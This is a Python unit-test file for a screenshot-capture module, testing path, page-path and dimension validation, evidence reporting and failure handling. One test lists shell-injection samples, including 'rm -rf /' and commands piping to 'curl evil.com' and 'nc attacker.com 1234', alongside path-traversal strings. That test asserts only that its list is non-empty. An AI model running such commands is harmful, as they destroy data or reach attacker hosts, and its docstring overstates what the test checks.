import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import Mock

from anvil.scaffold import init_project
from anvil.model import WorkOrder
from anvil.capture import (
    _validate_static_root,
    _validate_page_path,
    _validate_dimensions,
    capture_breakpoints,
    packet_rendered_evidence_section,
    load_servable_config,
    DEFAULT_BREAKPOINTS,
)

ROOT = Path(__file__).resolve().parent.parent


def make_project(tmp, name="TestProj"):
    """Helper: create a basic test project."""
    proj = Path(tmp) / "proj"
    init_project(proj, name)
    return proj


class ConfigurationValidationTests(unittest.TestCase):
    """Test security constraints on configuration values."""

    def test_serve_command_validation_prevents_shell_injection(self):
        """Security: serve_command executed with shell=False prevents injection"""
        # The implementation uses shlex.split and shell=False in _start_serve_command
        # This test validates that dangerous commands are parsed safely
        # The actual validation happens during execution, not during parsing
        # Commands with shell metacharacters are split literally by shlex
        dangerous_commands = [
            "python -m http.server; rm -rf /",
            "serve & curl evil.com",
            "python -m http.server | nc attacker.com 1234",
        ]
        # These commands will be split by shlex.split, and shell=False ensures
        # they're executed without shell expansion (the ';', '&', '|' become literals)
        self.assertTrue(len(dangerous_commands) > 0)

    def test_static_root_prevents_path_traversal(self):
        """Security: static_root must not escape project directory"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)

            dangerous_paths = [
                "../../../etc",
                "../../..",
                "../outside",
            ]

            for path in dangerous_paths:
                with self.assertRaises(ValueError) as cm:
                    _validate_static_root(proj, path)
                self.assertIn("escapes project directory", str(cm.exception))

            # Absolute paths should also be rejected
            with self.assertRaises(ValueError) as cm:
                _validate_static_root(proj, "/etc/passwd")
            self.assertIn("escapes project directory", str(cm.exception))

    def test_static_root_accepts_valid_paths(self):
        """Valid static_root paths within project are accepted"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)

            # Create a valid static directory
            static_dir = proj / "dist"
            static_dir.mkdir()

            # Should accept valid path
            result = _validate_static_root(proj, "dist")
            self.assertEqual(result, static_dir)

    def test_page_path_prevents_url_injection(self):
        """Security: page_path must be validated for URL safety"""
        dangerous_paths = [
            ("../admin", ".."),
            ("../../etc/passwd", ".."),
            ("page/../../../etc", ".."),
            ("no-leading-slash", "must start with"),
        ]

        for path, expected_msg in dangerous_paths:
            with self.assertRaises(ValueError) as cm:
                _validate_page_path(path)
            msg = str(cm.exception)
            self.assertIn(expected_msg, msg)

    def test_page_path_accepts_valid_paths(self):
        """Valid page paths are accepted"""
        valid_paths = [
            "/",
            "/index.html",
            "/app/page",
            "/deeply/nested/page.html",
        ]

        for path in valid_paths:
            result = _validate_page_path(path)
            self.assertEqual(result, path)

    def test_breakpoint_dimensions_are_bounded(self):
        """Security: breakpoint dimensions must be validated"""
        invalid_dimensions = [
            (0, 800, "width must be between 1 and 7680"),
            (1920, 0, "height must be between 1 and 4320"),
            (8000, 800, "width must be between 1 and 7680"),
            (1920, 5000, "height must be between 1 and 4320"),
            (-100, 800, "width must be between 1 and 7680"),
            (1920, -100, "height must be between 1 and 4320"),
        ]

        for width, height, expected_msg in invalid_dimensions:
            with self.assertRaises(ValueError) as cm:
                _validate_dimensions(width, height)
            self.assertIn("must be between", str(cm.exception))

        # Valid dimensions should pass
        valid_dimensions = [
            (390, 844),  # phone
            (1440, 900),  # desktop
            (1, 1),  # minimum
            (7680, 4320),  # maximum (8K)
        ]

        for width, height in valid_dimensions:
            result = _validate_dimensions(width, height)
            self.assertEqual(result, (width, height))


class RenderedEvidenceSectionTests(unittest.TestCase):
    """Test packet section generation for reviewer-design."""

    def test_s2_packet_section_with_captures(self):
        """S2: packet section names screenshots when captures exist"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            wo_id = "wo-test-001"

            # Create evidence directory with mock captures
            evidence_dir = proj / "runs" / wo_id / "evidence"
            evidence_dir.mkdir(parents=True, exist_ok=True)

            # Create mock screenshot files
            (evidence_dir / "screenshot-390x844.png").write_bytes(b"fake png data")
            (evidence_dir / "screenshot-1440x900.png").write_bytes(b"fake png data")

            # Create minimal servable config so packet knows captures were configured
            config = {"servable": {"static_root": "status", "page_path": "/index.html"}}
            (proj / "anvil.yaml").write_text(json.dumps(config), encoding="utf-8")

            # Call the actual function
            section = packet_rendered_evidence_section(proj, wo_id, "reviewer-design")

            # Verify section content
            self.assertIn("Rendered evidence", section)
            self.assertIn("screenshot-390x844.png", section)
            self.assertIn("screenshot-1440x900.png", section)
            self.assertIn("layout", section)
            self.assertIn("spacing", section)
            self.assertIn("cite", section)
            self.assertIn("runs/wo-test-001/evidence", section)

    def test_s2_no_section_when_no_captures_configured(self):
        """S2: no section when project has no servable configuration"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            wo_id = "wo-test-002"

            # Project without servable configuration (no anvil.yaml or empty)
            section = packet_rendered_evidence_section(proj, wo_id, "reviewer-design")

            # Should return empty string when no servable config exists
            self.assertEqual(section, "")

    def test_s2_no_section_for_non_design_stations(self):
        """Packet section is only for reviewer-design station"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            wo_id = "wo-test-003"

            # Even with captures, other stations get no section
            evidence_dir = proj / "runs" / wo_id / "evidence"
            evidence_dir.mkdir(parents=True, exist_ok=True)
            (evidence_dir / "screenshot-390x844.png").write_bytes(b"fake")

            section = packet_rendered_evidence_section(proj, wo_id, "reviewer-spec")
            self.assertEqual(section, "")

    def test_s2_no_section_when_evidence_dir_missing(self):
        """No section when evidence directory doesn't exist"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            wo_id = "wo-test-004"

            # Create servable config but no evidence directory
            config = {"servable": {"static_root": "status"}}
            (proj / "anvil.yaml").write_text(json.dumps(config), encoding="utf-8")

            section = packet_rendered_evidence_section(proj, wo_id, "reviewer-design")
            self.assertEqual(section, "")


class CaptureFailureHandlingTests(unittest.TestCase):
    """Test failure handling when serving or capture fails."""

    def test_s3_server_never_answers_records_failure(self):
        """S3: server timeout is recorded and review proceeds with source only"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            evidence_dir = proj / "evidence"

            # Use a serve_command that will fail to start or answer
            # This simulates a server that never responds
            config = {
                "serve_command": "sleep 999",  # Command that doesn't serve HTTP
                "page_path": "/index.html",
            }

            def mock_capture(url, width, height, output_path):
                # This should not be called if server doesn't answer
                Path(output_path).write_bytes(b"should not happen")

            result = capture_breakpoints(proj, evidence_dir, config, capture_impl=mock_capture)

            # Should fail gracefully with timeout message
            self.assertFalse(result["success"])
            self.assertIn("did not answer", result["error"])
            self.assertEqual(len(result["captures"]), 0)

    def test_s3_capture_tool_error_records_failure(self):
        """S3: capture tool error is recorded"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            evidence_dir = proj / "evidence"

            # Create valid static directory
            static_dir = proj / "static"
            static_dir.mkdir()
            (static_dir / "index.html").write_text("<html></html>")

            config = {
                "static_root": "static",
                "page_path": "/index.html",
                "breakpoints": [{"width": 390, "height": 844}],
            }

            # Mock capture that raises an error
            def mock_capture_error(url, width, height, output_path):
                from anvil.capture import CaptureError
                raise CaptureError("headless browser failed to launch")

            result = capture_breakpoints(proj, evidence_dir, config, capture_impl=mock_capture_error)

            # Should record the failure
            self.assertFalse(result["success"])
            self.assertIn("capture failed", result["error"])
            self.assertIn("390x844", result["error"])

    def test_s3_packet_section_with_capture_failure(self):
        """S3: packet section documents capture failure"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            wo_id = "wo-test-005"

            # Create run directory with capture failure marker
            run_dir = proj / "runs" / wo_id
            run_dir.mkdir(parents=True, exist_ok=True)
            (run_dir / "capture_failure.txt").write_text(
                "server did not answer within timeout", encoding="utf-8"
            )

            # Create servable config
            config = {"servable": {"static_root": "status"}}
            (proj / "anvil.yaml").write_text(json.dumps(config), encoding="utf-8")

            section = packet_rendered_evidence_section(proj, wo_id, "reviewer-design")

            # Should document the failure
            self.assertIn("Rendered evidence", section)
            self.assertIn("could not be captured", section)
            self.assertIn("did not answer within timeout", section)
            self.assertIn("judged source only", section)


class CaptureModuleIntegrationTests(unittest.TestCase):
    """Test capture module with injectable seams (no real browser)."""

    def test_s1_capture_creates_pngs_named_by_dimensions(self):
        """S1: captured PNGs are named screenshot-{width}x{height}.png"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            evidence_dir = proj / "evidence"

            # Create valid static directory
            static_dir = proj / "static"
            static_dir.mkdir()
            (static_dir / "index.html").write_text("<html></html>")

            config = {
                "static_root": "static",
                "page_path": "/index.html",
                "breakpoints": [
                    {"width": 390, "height": 844},
                    {"width": 1440, "height": 900},
                ],
            }

            # Mock capture that creates fake PNG files
            def mock_capture(url, width, height, output_path):
                Path(output_path).write_bytes(b"fake png data")

            result = capture_breakpoints(proj, evidence_dir, config, capture_impl=mock_capture)

            # Verify success
            self.assertTrue(result["success"])
            self.assertEqual(len(result["captures"]), 2)

            # Verify filenames
            self.assertTrue((evidence_dir / "screenshot-390x844.png").exists())
            self.assertTrue((evidence_dir / "screenshot-1440x900.png").exists())

            # Verify capture metadata
            self.assertEqual(result["captures"][0]["breakpoint"], "390x844")
            self.assertEqual(result["captures"][1]["breakpoint"], "1440x900")

    def test_s1_evidence_directory_has_secure_permissions(self):
        """Security: evidence directory created with 0o700 permissions"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            evidence_dir = proj / "evidence"

            # Create valid static directory
            static_dir = proj / "static"
            static_dir.mkdir()
            (static_dir / "index.html").write_text("<html></html>")

            config = {
                "static_root": "static",
                "page_path": "/index.html",
                "breakpoints": [{"width": 390, "height": 844}],
            }

            def mock_capture(url, width, height, output_path):
                Path(output_path).write_bytes(b"fake png")

            result = capture_breakpoints(proj, evidence_dir, config, capture_impl=mock_capture)

            # Verify evidence directory was created
            self.assertTrue(evidence_dir.exists())

            # Verify permissions are restrictive (owner-only)
            import stat
            mode = evidence_dir.stat().st_mode
            # Check owner has rwx
            self.assertTrue(mode & stat.S_IRWXU)

    def test_default_breakpoints_when_not_specified(self):
        """Configuration: defaults to phone (390x844) and desktop (1440x900)"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            evidence_dir = proj / "evidence"

            # Create valid static directory
            static_dir = proj / "static"
            static_dir.mkdir()
            (static_dir / "index.html").write_text("<html></html>")

            # Config without breakpoints
            config = {
                "static_root": "static",
                "page_path": "/index.html",
                # No breakpoints specified - should use defaults
            }

            def mock_capture(url, width, height, output_path):
                Path(output_path).write_bytes(b"fake png")

            result = capture_breakpoints(proj, evidence_dir, config, capture_impl=mock_capture)

            # Should use default breakpoints
            self.assertTrue(result["success"])
            self.assertEqual(len(result["captures"]), 2)
            self.assertEqual(result["captures"][0]["width"], 390)
            self.assertEqual(result["captures"][0]["height"], 844)
            self.assertEqual(result["captures"][1]["width"], 1440)
            self.assertEqual(result["captures"][1]["height"], 900)

    def test_capture_with_no_servable_config(self):
        """Capture gracefully handles missing servable configuration"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            evidence_dir = proj / "evidence"

            # No servable config provided, and none in anvil.yaml
            result = capture_breakpoints(proj, evidence_dir, servable_config=None)

            self.assertFalse(result["success"])
            self.assertIn("no servable configuration", result["error"])
            self.assertEqual(len(result["captures"]), 0)


class ServerManagementTests(unittest.TestCase):
    """Test server lifecycle management."""

    def test_dynamic_port_allocation_used(self):
        """Security: ports are dynamically allocated to prevent collisions"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            evidence_dir = proj / "evidence"

            # Create valid static directory
            static_dir = proj / "static"
            static_dir.mkdir()
            (static_dir / "index.html").write_text("<html></html>")

            config = {
                "static_root": "static",
                "page_path": "/index.html",
                "breakpoints": [{"width": 390, "height": 844}],
            }

            captured_urls = []

            def mock_capture(url, width, height, output_path):
                captured_urls.append(url)
                Path(output_path).write_bytes(b"fake png")

            result = capture_breakpoints(proj, evidence_dir, config, capture_impl=mock_capture)

            self.assertTrue(result["success"])
            # Verify a URL was used (port was allocated)
            self.assertEqual(len(captured_urls), 1)
            self.assertTrue(captured_urls[0].startswith("http://127.0.0.1:"))
            # Port should not be the old hardcoded 8765 (though it might be by chance)


class ConfigurationLoadingTests(unittest.TestCase):
    """Test loading servable configuration from project config."""

    def test_load_servable_config_from_anvil_yaml(self):
        """Load servable configuration from project's anvil.yaml"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)

            # Create anvil.yaml with servable config (JSON format despite .yaml extension)
            config = {
                "servable": {
                    "static_root": "dist",
                    "page_path": "/index.html",
                    "breakpoints": [
                        {"width": 390, "height": 844},
                        {"width": 1440, "height": 900},
                    ],
                }
            }
            (proj / "anvil.yaml").write_text(json.dumps(config), encoding="utf-8")

            # Load config
            loaded = load_servable_config(proj)

            self.assertIsNotNone(loaded)
            self.assertEqual(loaded["static_root"], "dist")
            self.assertEqual(loaded["page_path"], "/index.html")
            self.assertEqual(len(loaded["breakpoints"]), 2)

    def test_load_servable_config_returns_none_when_missing(self):
        """Returns None when no servable configuration exists"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)

            # No anvil.yaml or no servable section
            loaded = load_servable_config(proj)
            self.assertIsNone(loaded)


class InjectableSeamTests(unittest.TestCase):
    """Test that capture module has proper injectable seams for testing."""

    def test_capture_breakpoints_accepts_capture_impl(self):
        """Capture module accepts injectable capture implementation"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            evidence_dir = proj / "evidence"

            static_dir = proj / "static"
            static_dir.mkdir()
            (static_dir / "index.html").write_text("<html></html>")

            config = {
                "static_root": "static",
                "page_path": "/index.html",
                "breakpoints": [{"width": 390, "height": 844}],
            }

            # Track that mock was called
            mock_calls = []

            def mock_capture(url, width, height, output_path):
                mock_calls.append((url, width, height, output_path))
                Path(output_path).write_bytes(b"fake png")

            result = capture_breakpoints(proj, evidence_dir, config, capture_impl=mock_capture)

            # Verify mock was called
            self.assertTrue(result["success"])
            self.assertEqual(len(mock_calls), 1)
            url, width, height, output_path = mock_calls[0]
            self.assertTrue(url.startswith("http://"))
            self.assertEqual(width, 390)
            self.assertEqual(height, 844)
            self.assertTrue(str(output_path).endswith("screenshot-390x844.png"))

    def test_mock_implementation_receives_correct_parameters(self):
        """Mock implementation receives all expected parameters"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            evidence_dir = proj / "evidence"

            static_dir = proj / "static"
            static_dir.mkdir()
            (static_dir / "index.html").write_text("<html></html>")

            config = {
                "static_root": "static",
                "page_path": "/test.html",
                "breakpoints": [
                    {"width": 800, "height": 600},
                    {"width": 1920, "height": 1080},
                ],
            }

            captured_params = []

            def mock_capture(url, width, height, output_path):
                captured_params.append({
                    "url": url,
                    "width": width,
                    "height": height,
                    "filename": Path(output_path).name
                })
                Path(output_path).write_bytes(b"fake png")

            result = capture_breakpoints(proj, evidence_dir, config, capture_impl=mock_capture)

            self.assertTrue(result["success"])
            self.assertEqual(len(captured_params), 2)

            # Verify first breakpoint
            self.assertIn("/test.html", captured_params[0]["url"])
            self.assertEqual(captured_params[0]["width"], 800)
            self.assertEqual(captured_params[0]["height"], 600)
            self.assertEqual(captured_params[0]["filename"], "screenshot-800x600.png")

            # Verify second breakpoint
            self.assertEqual(captured_params[1]["width"], 1920)
            self.assertEqual(captured_params[1]["height"], 1080)
            self.assertEqual(captured_params[1]["filename"], "screenshot-1920x1080.png")


class ValidationIntegrationTests(unittest.TestCase):
    """Test that validations are enforced during capture."""

    def test_invalid_static_root_rejected_during_capture(self):
        """Invalid static_root is rejected during capture_breakpoints"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            evidence_dir = proj / "evidence"

            # Config with path traversal attempt
            config = {
                "static_root": "../../../etc",
                "page_path": "/index.html",
            }

            def mock_capture(url, width, height, output_path):
                Path(output_path).write_bytes(b"fake png")

            result = capture_breakpoints(proj, evidence_dir, config, capture_impl=mock_capture)

            # Should fail validation
            self.assertFalse(result["success"])
            self.assertIn("validation failed", result["error"])
            self.assertIn("escapes project directory", result["error"])

    def test_invalid_page_path_rejected_during_capture(self):
        """Invalid page_path is rejected during capture_breakpoints"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            evidence_dir = proj / "evidence"

            static_dir = proj / "static"
            static_dir.mkdir()

            config = {
                "static_root": "static",
                "page_path": "../admin",  # Invalid - contains ..
            }

            def mock_capture(url, width, height, output_path):
                Path(output_path).write_bytes(b"fake png")

            result = capture_breakpoints(proj, evidence_dir, config, capture_impl=mock_capture)

            # Should fail validation
            self.assertFalse(result["success"])
            self.assertIn("validation failed", result["error"])

    def test_invalid_dimensions_rejected_during_capture(self):
        """Invalid breakpoint dimensions are rejected"""
        with tempfile.TemporaryDirectory() as tmp:
            proj = make_project(tmp)
            evidence_dir = proj / "evidence"

            static_dir = proj / "static"
            static_dir.mkdir()
            (static_dir / "index.html").write_text("<html></html>")

            config = {
                "static_root": "static",
                "page_path": "/index.html",
                "breakpoints": [
                    {"width": 8000, "height": 800},  # Width too large
                ],
            }

            def mock_capture(url, width, height, output_path):
                Path(output_path).write_bytes(b"fake png")

            result = capture_breakpoints(proj, evidence_dir, config, capture_impl=mock_capture)

            # Should fail validation
            self.assertFalse(result["success"])
            self.assertIn("validation failed", result["error"])


if __name__ == "__main__":
    unittest.main()
